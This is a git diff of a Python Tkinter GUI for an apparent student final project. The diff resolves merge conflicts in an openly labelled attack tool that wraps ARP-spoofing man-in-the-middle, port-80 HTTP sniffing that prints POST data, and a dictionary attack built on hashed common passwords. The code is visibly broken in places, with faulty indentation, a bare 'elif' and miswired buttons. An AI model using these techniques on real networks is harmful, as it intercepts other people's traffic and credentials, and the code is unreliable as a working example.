@@ -11,9 +11,6 @@ import iface
 # GUI Rigging
 window = Tk()  # create tkinter GUI object
 window.title("Group 1 Final Project")  # Project Title
-<<<<<<< Updated upstream
-window.geometry('560x270')  # Set size of the pane
-=======
 window.geometry('500x500')  # Set size of the pane
 
 #Label for number of CPU cores
@@ -24,7 +21,6 @@ labelNo_Of_CPU.grid(column=2,row=4)
 textNo_Of_CPU = Entry(window,width=20)
 textNo_Of_CPU.grid(column=3,row=4)
 
->>>>>>> Stashed changes
 # Get the network resource names
 #Label for number of CPU cores
 labelNo_Of_CPU = Label(window,text="Number of CPU Cores (2,3,6)")
@@ -122,38 +118,6 @@ def mitm(textVictimIP,textRouterIP):
             break
 
 # Packet Sniff
-<<<<<<< Updated upstream
-# Scans for port 80 HTTP requests. ARP will need to be beforehand. 
-def sniffer():
-	
-	def sniff_packets(iface):
-	    # Sniff 80 port packets with iface
-	    if iface:
-		# port 80 for http
-		sniff(filter="port 80", prn=process_packet, iface=textInterface, store=False)
-		#process_packet(packet)
-	    elif:
-		# sniff with default interface
-		sniff(filter="port 80", prn=process_packet, store=False)
-		#process_packet(packet)
-	    else: 
-		pass
-
-	#Whenever a packet is sniffed, this will need to be excuted
-def packet_processor():
-	
-	def process_packet(packet):
-	    if packet.haslayer(HTTPRequest):
-		url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
-		ip = packet[IP].src
-		method = packet[HTTPRequest].Method.decode()
-		print(f"{ip} Requested {url} with {method}{packetsniffer.RESET}")
-		if packetsniffer.show_raw and packet.haslayer(Raw) and method == "POST":
-		    print(f"Useful Raw Data: {packet[Raw].load}{packetsniffer.RESET}")
-
-# if packet is successful, get hash as a string and compare it to dictionary
-
-=======
 def sniff_packets(iface):
     # Sniff 80 port packets with iface
     if iface:
@@ -194,7 +158,6 @@ def passwordFiles():
     hashed_words_file = "10k_most_common_hashed.txt"  # output file name
     # hash type
     hash_type = "md5"
->>>>>>> Stashed changes
 
 def dictionary_attack():
 
@@ -206,35 +169,18 @@ def dictionary_attack():
     hash_type = "md5"
 
 
-<<<<<<< Updated upstream
-    # create hashed version of passwords most common passwords
-    def create_hash_md5_text_file(input_list, output_file_name, hash_type):
-        input_list = list(map(str.strip, input_list))  # strips away the /n
-        hashesToExport = []
-=======
-        hashesToExport.append(hashOfWord)
-        print("Creating hash text file: {} ...".format(output_file_name))
->>>>>>> Stashed changes
+    hashesToExport.append(hashOfWord)
+    print("Creating hash text file: {} ...".format(output_file_name))
 
-        # foreach word in the file look for the hash types
-        for word in input_list:
-            if hash_type == "md5":
-                crypt = hashlib.md5()
-            elif hash_type == "sha1":
-                crypt = hashlib.sha1()
+    # foreach word in the file look for the hash types
+    for word in input_list:
+        if hash_type == "md5":
+            crypt = hashlib.md5()
+        elif hash_type == "sha1":
+            crypt = hashlib.sha1()
             crypt.update(bytes(word, encoding='utf-8'))
             hashOfWord = crypt.hexdigest()
 
-<<<<<<< Updated upstream
-            hashesToExport.append(hashOfWord)
-        print("Creating hash text file: {} ...".format(output_file_name))
-
-        # create output file
-        with open(output_file_name, 'w') as f:
-            for hashOfWord in hashesToExport:
-                f.write("%s/n" % hashOfWord)
-        print("{} has been successfully created".format(output_file_name))
-=======
 # get the list of words from the file
 def list_of_words_from_file(filename):
     print("Opening file: {}".format(filename))
@@ -357,7 +303,6 @@ def numberOfCPUs(no_of_cpu):
         print("Error message: You have {} CPU. This code has been constructed for either 2 or 4 CPU.".format(no_of_cpu))
         print(
             "How to fix: Go to line 52-77. I have hardcoded the number of processors to run this. You'll just have to change the if-else statement to cater to your number of cpu.")
->>>>>>> Stashed changes
 
 
     # get the list of words from the file
@@ -501,27 +446,22 @@ def buttonrestoreARP():
     masterRestoreARPCall(textInterface,textVictimIP,textRouterIP)
     outputText.insert(END,"Restore ARP Engaged\n")
 def storeVariables():
-   global textNo_Of_CPU = entryTextNo_Of_CPU.get()
+    textNo_Of_CPU = entryTextNo_Of_CPU.get()
     print(textNo_Of_CPU)
     #store the variable textInterface
-    global textInterface = entryTextInterface.get()
+    textInterface = entryTextInterface.get()
     print(textInterface)
     #store the variable 
-    global textVictimIP = entryTextVictimIP.get()
+    textVictimIP = entryTextVictimIP.get()
     print(textVictimIP)
     #store the variable textRouterIP
-    global textRouterIP = entryTextRouterIP.get()
+    textRouterIP = entryTextRouterIP.get()
     print(textRouterIP)
     outputText.insert(END,"Input Variables Stored!\n")
 
 # Button for handling mitm() execute call
-<<<<<<< Updated upstream
-buttonMitM = Button(window, text="MitM", command=buttonMitM)
-buttonMitM.grid(column=2, row=0)
-=======
 buttonMitM = Button(window, text="MitM", command=mitm(textVictimIP,textRouterIP))
 buttonMitM.grid(column=1, row=4)
->>>>>>> Stashed changes
 
 # Button for handling sniff_packets() execute call
 buttonPacketSniffer = Button(window, text="Engage Packet Sniff", command=buttonSniffer)
@@ -539,16 +479,6 @@ buttonRestoreARP.grid(column=2, row=3)
 buttonStoreVariables = Button(window, text= "Store Variables", command=storeVariables)
 buttonStoreVariables.grid(column=2,row=5)
 # Button for closing the application
-<<<<<<< Updated upstream
-buttonClose = Button(window, text="Quit",command=exit)
-buttonClose.grid(column=1, row=10)
-
-outputText = Text(window,height=5,width=35)
-outputText.grid(column=0,row=9)
-
-window.mainloop()  # keeps window open
-=======
 buttonClose = Button(window, text="Quit", command="close")
 buttonClose.grid(column=1, row=4)
 window.mainloop()  # keeps window open
->>>>>>> Stashed changes
